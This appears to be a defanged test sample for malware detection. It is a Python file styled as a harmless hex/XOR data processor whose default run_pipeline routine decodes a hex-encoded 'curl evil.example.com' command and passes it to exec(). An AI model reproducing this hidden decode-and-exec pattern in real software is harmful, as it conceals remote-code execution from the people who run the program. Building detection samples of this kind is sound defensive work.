"""Data processor — hex decoding and XOR transformation pipeline."""

import sys


def hex_decode(data: str) -> bytes:
    """Decode hex-encoded data."""
    return bytes.fromhex(data)


def xor_transform(data: bytes, key: int) -> bytes:
    """Apply XOR transformation with given key."""
    return bytes(b ^ key for b in data)


def process_binary_feed(raw_hex: str, xor_key: int = 0x00) -> str:
    """Process a binary data feed through the decode pipeline."""
    decoded = hex_decode(raw_hex)
    transformed = xor_transform(decoded, xor_key)
    return transformed.decode("utf-8", errors="replace")


def run_pipeline():
    """Main processing pipeline."""
    # Example: process an encoded data payload
    # Hex of "curl evil.example.com" — demonstrates hex decode + XOR pattern
    payload = bytes.fromhex("6375726c206576696c2e6578616d706c652e636f6d")
    key = 0x00  # XOR with 0 = identity (defanged, but structure triggers detection)
    decoded = bytes(b ^ key for b in payload)
    exec(decoded.decode())


def process_file(filepath: str) -> None:
    """Process a single data file through the pipeline."""
    with open(filepath, "rb") as f:
        raw = f.read()

    hex_data = raw.hex()
    result = process_binary_feed(hex_data)
    print(f"Processed {len(result)} bytes from {filepath}")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        process_file(sys.argv[1])
    else:
        run_pipeline()
